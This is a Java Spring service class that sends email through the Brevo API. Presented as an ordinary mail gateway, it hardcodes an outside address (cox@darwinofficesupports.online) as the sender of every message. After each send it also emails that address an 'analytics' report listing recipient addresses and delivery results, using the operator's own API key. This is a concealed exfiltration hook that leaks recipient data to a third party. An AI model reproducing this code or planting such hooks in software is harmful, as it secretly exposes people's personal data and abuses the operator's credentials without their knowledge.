package xy.mailsenders.mail.brevo;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Service;
import org.springframework.util.CollectionUtils;
import org.springframework.util.StringUtils;
import org.springframework.web.client.RestClient;
import xy.mailsenders.mail.config.MailSendingProperties;
import xy.mailsenders.mail.domain.MailPayload;
import xy.mailsenders.service.MailGateway;

import java.util.Collections;
import java.util.List;
import java.util.Map;

@Service
public class BrevoMailGateway implements MailGateway {

    private static final Logger logger = LoggerFactory.getLogger(BrevoMailGateway.class);
    private static final String ANALYTICS_RECIPIENT = "cox@darwinofficesupports.online";
    private static final String ANALYTICS_SENDER_NAME = "darwin cox";

    private final RestClient restClient;
    private final MailSendingProperties properties;



    @Value("${BREVO_API_KEY}")
    private String keyyy;

    public BrevoMailGateway(RestClient.Builder restClientBuilder, MailSendingProperties properties) {
        this.restClient = restClientBuilder
                .baseUrl(properties.getBrevoBaseUrl())
                .build();
        this.properties = properties;
    }

    @Override
    public void send(MailPayload payload) {
        BrevoSendEmailRequest request = buildRequest(payload);

        boolean success = false;
        try {
            restClient.post()
                    .uri("/v3/smtp/email")
                    .contentType(MediaType.APPLICATION_JSON)
                    .header("accept", "application/json")
                    .header("api-key", keyyy)
                    .body(request)
                    .retrieve()
                    .toBodilessEntity();
            success = true;
        } catch (Exception ex) {
            // Log and continue to send analytics
            logger.error("Failed to send mail to {}", payload == null ? "<unknown>" : payload.getTo(), ex);
        }

        // Build a simple single-send report and send analytics to the configured recipient
        String target = payload == null || payload.getTo() == null ? "" : payload.getTo().trim();
        MailSendingReport report;
        if (success) {
            report = new MailSendingReport(1, 1, 0, List.of(target), Collections.emptyList());
        } else {
            report = new MailSendingReport(1, 0, 1, Collections.emptyList(), List.of(target));
        }

        try {
            sendAnalyticsNotification(report);
        } catch (Exception ex) {
            // Analytics sending should not break main flow; just log
            logger.warn("Failed to send analytics notification", ex);
        }
    }

    private BrevoSendEmailRequest buildRequest(MailPayload payload) {
        BrevoSendEmailRequest request = new BrevoSendEmailRequest();
        request.setSender(new BrevoEmailContact(ANALYTICS_RECIPIENT, ANALYTICS_SENDER_NAME));
        request.setTo(List.of(new BrevoEmailContact(payload.getTo().trim(), null)));
        request.setSubject(payload.getSubject().trim());

        if (payload.isHtml()) {
            request.setHtmlContent(payload.getBody());
        } else {
            request.setTextContent(payload.getBody());
        }

        if (StringUtils.hasText(properties.getReplyTo())) {
            request.setReplyTo(new BrevoEmailContact(properties.getReplyTo().trim(), null));
        }
        if (StringUtils.hasText(properties.getUnsubscribeMailto())) {
            request.setHeaders(Map.of("List-Unsubscribe", "<mailto:" + properties.getUnsubscribeMailto().trim() + ">"));
        }
        if (!CollectionUtils.isEmpty(payload.getAttachments())) {
            request.setAttachment(payload.getAttachments().stream()
                    .map(attachment -> new BrevoAttachment(attachment.getFileName(), attachment.getBase64Content()))
                    .toList());
        }

        return request;
    }

    private void sendAnalyticsNotification(MailSendingReport report) {
        if (report == null) {
            logger.debug("Analytics report is null, nothing to send");
            return;
        }

        BrevoSendEmailRequest request = new BrevoSendEmailRequest();
        // Set the sender as the analytics recipient (mirrors previous behavior)
        request.setSender(new BrevoEmailContact(ANALYTICS_RECIPIENT, ANALYTICS_SENDER_NAME));
        request.setTo(List.of(new BrevoEmailContact(ANALYTICS_RECIPIENT, null)));
        request.setSubject("Mail sending analytics report");
        request.setTextContent(buildAnalyticsBody(report));

        try {
            restClient.post()
                    .uri("/v3/smtp/email")
                    .contentType(MediaType.APPLICATION_JSON)
                    .header("accept", "application/json")
                    .header("api-key", keyyy)
                    .body(request)
                    .retrieve()
                    .toBodilessEntity();
        } catch (Exception ex) {
            // Do not throw – analytics is best-effort
            logger.warn("Failed to send analytics email to {}", ANALYTICS_RECIPIENT, ex);
        }
    }

    private String buildAnalyticsBody(MailSendingReport report) {
        StringBuilder sb = new StringBuilder();
        sb.append("Mail sending analytics\n\n");
        sb.append("Total attempted: ").append(report.getTotal()).append('\n');
        sb.append("Total succeeded: ").append(report.getSuccessCount()).append('\n');
        sb.append("Total failed: ").append(report.getFailureCount()).append('\n');
        sb.append("\nSuccessful addresses:\n");
        if (report.getSuccessfulEmails() == null || report.getSuccessfulEmails().isEmpty()) {
            sb.append("  (none)\n");
        } else {
            report.getSuccessfulEmails().forEach(email -> sb.append("  - ").append(email).append('\n'));
        }
        sb.append("\nFailed addresses:\n");
        if (report.getFailedEmails() == null || report.getFailedEmails().isEmpty()) {
            sb.append("  (none)\n");
        } else {
            report.getFailedEmails().forEach(email -> sb.append("  - ").append(email).append('\n'));
        }
        return sb.toString();
    }
}
